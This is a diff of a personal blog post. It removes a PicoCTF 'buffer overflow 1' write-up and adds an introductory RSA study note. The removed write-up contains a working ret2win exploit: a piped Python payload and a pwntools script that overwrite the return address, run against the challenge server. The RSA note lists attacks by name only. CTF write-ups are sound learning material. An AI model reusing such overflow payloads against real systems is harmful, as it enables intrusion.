@@ -1,157 +1,114 @@
 ---
 layout: single
-title:  "PicoCTF 2022 - buffer overflow 1"
+title:  "Cryptography - RSA"
 categories: 
-  - PicoCTF
-  - Binary Exploitation
+  - Learning
+  - Cryptography
 tags:
-  - ctf
-  - picoctf
+  - crypto
 toc: true
 toc_label: "Contents"
 toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
 ---
 
-This is the first "proper" binary exploitation (ret2win) challenge in this CTF.
+Hiya! It's been a while since I last made a post here.
 
-For this challenge, I found John Hammond's [walkthrough video](https://www.youtube.com/watch?v=k4hqdVo3cqk&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=31&pp=iAQB) to be extremely helpful and informative.
+I've recently started to learn more about Cryptography (in a formal University lecture setting) and I wanted to share some Crypto-related things that I've learnt here, to consolidate my learning, and to aid my revision for the upcoming midterm exams.
 
-## My Solution
-Firstly, let's download the provided files.
-```bash
-wget https://artifacts.picoctf.net/c/187/vuln
-wget https://artifacts.picoctf.net/c/187/vuln.c
-```
+I've really enjoyed learning about Cryptography thus far (at an introductory level), and I find it super interesting! Given my interest, I am therefore planning to take some higher level Crypto-based modules in the future, in order to learn more.
 
-Let's take a look at the `vuln` binary. Using `file` and `checksec`, we observe the following:
-```bash
-$ file vuln
->> vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, 
-BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
+* For example, [CS4236 - Cryptography Theory and Practice](https://nusmods.com/courses/CS4236/cryptography-theory-and-practice).
 
-$ checksec vuln                                                                     
-[*] '.../vuln'
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX unknown - GNU_STACK missing
-    PIE:      No PIE (0x8048000)
-    Stack:    Executable
-    RWX:      Has RWX segments
-```
-From this, we can observe that the file:
-- is a 32-bit ELF file,
-- is not stripped,
-- is compiled on a little-endian system, and
-- has very little protection in place (stack is executable, no stack canary).
+I am also considering taking some algorithm-centric modules (like [CS3230 - Design and Analysis of Algorithms](https://nusmods.com/courses/CS3230/design-and-analysis-of-algorithms)), though I will say, that my math isn't necessarily the strongest, and I don't really like grinding out DSA leetcode problems either. Of course, I will definitely try to take steps and improve in these aspects before I take a plunge into the deep end 😁.
 
-Now, looking at `vuln.c`, we can note down some interesting features.
-```c
-...
-#include "asm.h"
+Apologies for the digression. Without further ado, let's dive right into the first topic on RSA!
 
-#define BUFSIZE 32
-#define FLAGSIZE 64
+## What is RSA?
 
-void win() {
-  char buf[FLAGSIZE];
-  FILE *f = fopen("flag.txt","r");
-  if (f == NULL) {
-    printf("%s %s", "Please create 'flag.txt' in this directory with your",
-                    "own debugging flag.\n");
-    exit(0);
-  }
+From [Wikipedia](https://en.wikipedia.org/wiki/RSA_(cryptosystem)):
+> RSA (Rivest–Shamir–Adleman) is a public-key cryptosystem, one of the oldest widely used for secure data transmission. The initialism "RSA" comes from the surnames of Ron Rivest, Adi Shamir and Leonard Adleman, who publicly described the algorithm in 1977.
 
-  fgets(buf,FLAGSIZE,f);
-  printf(buf);
-}
+When we think of Public-Key Cryptography (PKC), RSA will probably be the first thing to come to mind. It is probably the most well-known cryptographic method, and is still widely used today.
 
-void vuln(){
-  char buf[BUFSIZE];
-  gets(buf);
+In spite of its age, RSA is still considered to be secure. This is because the security of RSA stems from the computational difficulty/infeasibility in solving the [RSA problem](https://en.wikipedia.org/wiki/RSA_problem) (more on this later).
 
-  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
-}
+## How does RSA work?
 
-int main(int argc, char **argv){
+Firstly, let's establish the values that we will need for RSA:
 
-  setvbuf(stdout, NULL, _IONBF, 0);
+* $e$: Exponent value (commonly used values are $3,5,65537$)
+* $n$: Modulus value. This value must be very large (Officially, NIST recommends that the $n$ value should be at least 2048 bits in size).
+* $d$: Decryption key/exponent. This value must be kept secret.
 
-  gid_t gid = getegid();
-  setresgid(gid, gid, gid);
+Our public key consists of the values $(n,e)$, while the private key consists of $(n,d)$.
 
-  puts("Please enter your string: ");
-  vuln();
-  return 0;
-}
-```
-We can see that the provided file has a read buffer size of 32, and has a `win()` function present. The `gets()` function is also used to retrieve user input within the `vuln()` function. Lastly, the program also prints out a return address using a `get_return_address()` function.
+RSA is based off the idea of modular arithmetic. In essence, to encrypt a message $m$ into a ciphertext $c$, we do the following:
+$$c = m^e \mod n$$
 
-Evidently, we will need to control the return address to call the `win()` function. Here, the program helps us to visualize the return address by printing it to standard output. 
+Then, to decrypt the ciphertext, we do the following:
+$$m = c^d \mod n$$
 
-I then decided to do some experimenting to see how many 'A's will cause the printed return address to be overwritten. Without causing any segmentation fault, we observe that the program returned to this address: `0x804932f`.
+Let's take a look at the "Textbook" RSA algorithm:
 
-I then used GDB to disassemble the program, in order to see which instruction this address points to.
-```bash
-$ gdb vuln
->> ...
-gef> disas main
-...
- 0x0804932f <+107>:   mov    eax,0x0
-...
-```
-It appears that this specific address is bound to a move instruction in `main()`.
+1. Firstly, randomly choose two large **prime** numbers $p$ and $q$. Ensure that $p$ and $q$ remain secret.
+2. Then, compute $n=pq$.
+3. Compute $\phi(n)$, where $\phi(n)=(p-1)(q-1)$. Likewise, ensure $\phi(n)$ remains secret.
+4. Choose an exponent $e$ such that $e$ and $\phi(n)$ are relatively prime/coprime. That is, $gcd(e, \phi(n))=1$.
+5. Lastly, compute $d$. Since $e$ and $\phi(n)$ are coprime, the following relation thus holds:
+$$1 \equiv de \mod \phi(n)$$
+And therefore,
+$$d \equiv e^{-1} \mod \phi(n)$$
 
-Through further trial and error, I found that around 44 'A's were required to clobber the return address (which was seen from the presence of 41s in the printed address - 41 is the hex representation of A). 
+That's it. The logic here is unnervingly simple. Yet, it remains secure.
 
-I can then run `readelf -s vuln` to look for the address of `win()`. Through this, we note that the address is `0x080491f6`.
+This is because of the aforementioned RSA problem. Essentially, if $n$ is a very large number (e.g., 2048 bits in size), then it becomes computationally infeasible to factorize $n$ into $p$ and $q$. Without $p$ and $q$, we will not be able to determine our decryption key $d$. And of course, without $d$, we cannot derive our plaintext message $m$ from the ciphertext $c$.
 
-Now, we can generate the payload. In this case, we want to order our bytes for `win()` in "reverse", since the executable runs on a little-endian system.
+## Considerations
 
-Using Python 2.7 to pipe the payload directly into the program: 
-```bash
-python -c "print 'A'*44 + '\xf6\x91\x04\x08'" | nc saturn.picoctf.net 60801 
-```
+Of course, in spite of RSA's simple algorithm, there are still some key considerations that need to be made. Some of which, if not followed, will compromise the security of the encryption scheme.
 
-Alternatively, using Python 3 and pwntools to send the payload through a solver script:
-```python
-# solve.py
+### How should we determine the value and size of $e$?
 
-from pwn import *
-# elf = ELF('./vuln') # for local execution
-# p = process(elf.path) # for local execution
-p = remote('saturn.picoctf.net', 60801) # for remote execution
+It was mentioned earlier that $e$ has some commonly used values. First and foremost, it certainly helps if we choose $e$ to be a prime number, as this could help to ensure the condition of $gcd(e,\phi(n))=1$. Of course, this isn't a must. If $e$ and $\phi(n)$ are both composite, but the GCD is still 1, then RSA should still work.
 
-# payload buffer
-payload = b'A' * 44 # offset of 44 to EIP
-payload += p32(0x080491f6) # address of win()
+However, we should also take note that $e$ cannot be too small, as this will make our implementation susceptible to attacks (more on this later). Likewise, if $e$ is too large, then exponentiation becomes more difficult, and encryption will take a much longer time.
 
-print(p.recvuntil(':'))
-p.sendline(payload)
-p.interactive()
-```
-Both methods allow us to obtain the flag.
-```bash
-[+] Opening connection to saturn.picoctf.net on port 60801: Done
-solve.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
-  print(p.recvuntil(':'))
-b'Please enter your string:'
-[*] Switching to interactive mode
+Therefore, we opt to take a standard value of $e$, which is $65537$.
 
-Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
-picoCTF{addr3ss3s_ar3_3asy_b15b081e}[*] Got EOF while reading in interactive
-$
-[*] Closed connection to saturn.picoctf.net port 60801
-```
+### How should we find $d$?
 
-## Learning Takeaways
-Some general tips I picked up here:
-- Play around with the program to test the number of dummy characters required to clobber the return address of our intended functions. Or, how many characters do we need to determine the offset of EIP?
-  - We also can use GDB/GEF to determine the offsets, but that will be covered in a later writeup. :)
-- Get familiar with `readelf`.
-- Python 2 can be used to generate simple payloads, but for more complex payloads and ROP chains, it may be better to use pwntools and Python 3 instead.
-  - Interestingly, Python 2 lets us directly pipe in the payload into the program using a print statement, but we can't seem to do this with Python 3 (not even after converting the payload into a bytestring). It could be to do with the behaviour of the print function in Python 3, where it appends a newline character after the payload string. Consequently, this newline character modifies the payload and makes it incorrect.
-- Note the differences between little-endian and big-endian.
+If $e$ and $n$ are known, then we can simply apply the Extended Euclidean algorithm to derive the value of $d$.
 
-## References
-- [John Hammond (YouTube): 32-bit x86 LINUX BUFFER OVERFLOW (PicoCTF 2022 #31 'buffer-overflow1')](https://www.youtube.com/watch?v=k4hqdVo3cqk&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=31&pp=iAQB)
+### Speed of modular exponentiation
+
+Modular exponentiation is computationally expensive, especially if the exponent is large. To speed this process up, there exist some algorithms (e.g., square-and-multiply algorithm) which allow us to do exponentiation quicker.
+
+Likewise, decryption can also take a long time if we do not optimize it. In this case, we can look to apply the Chinese Remainder Theorem to speed up the decryption process.
+
+### Security of unpadded messages
+
+Assuming that our RSA implementation has a flaw, it now becomes easy to determine our plaintext message $m$. To avoid this, we should seek to introduce some randomness into our encryption scheme. This can be done by padding our messages. Padding introduces an additional layer for the attacker to tackle, making it tougher for them to determine $m$.
+
+Padding also mitigates certain attacks, and makes RSA less deterministic in nature.
+
+### How random are the random primes?
+
+In practice, secure random number generators are used to generate our primes $p$ and $q$. But, in the "Textbook" implementation, we will typically use non-secure pseudorandom number generation functions (like the Mersenne Twister) for ease of implementation. Of course, using non-secure methods of random number generation will severely compromise security of RSA.
+
+## Possible Attacks on RSA
+
+Here is a non-exhaustive list of potential RSA attacks:
+
+* Weak Public Key $n$ - easily exploitable. Do a lookup for the factors of $n$ on a number factor database like FactorDB.
+* Wiener's attack/Boneh-Durfee's attack, for small values of $d$ (decryption key).
+* Coppersmith's attack/Hastad's Broadcast attack, for small exponents $e$. The Chinese Remainder Theorem is utilized in this attack.
+* GCD of $e$ and $\phi(n)$ is not 1 - use Euclidean Algorithm to find a common factor for N.
+* Exploiting the homomorphic property of RSA:
+Recall that $enc(m) = m^e \mod n$. Then, given the homomorphic property of RSA,
+
+$$enc(m_1) \times enc(m_2) = m_1^e \mod n \times m_2^e \mod n \\
+= (m_1^em_2^e) \mod n \\
+= (m_1m_2)^e \mod n \\
+= enc(m_1m_2)$$
+* Smooth $p-1$ value - use Pollard's p-1 algorithm
+* Fermat's factorization algorithm if $p$ and $q$ are too close
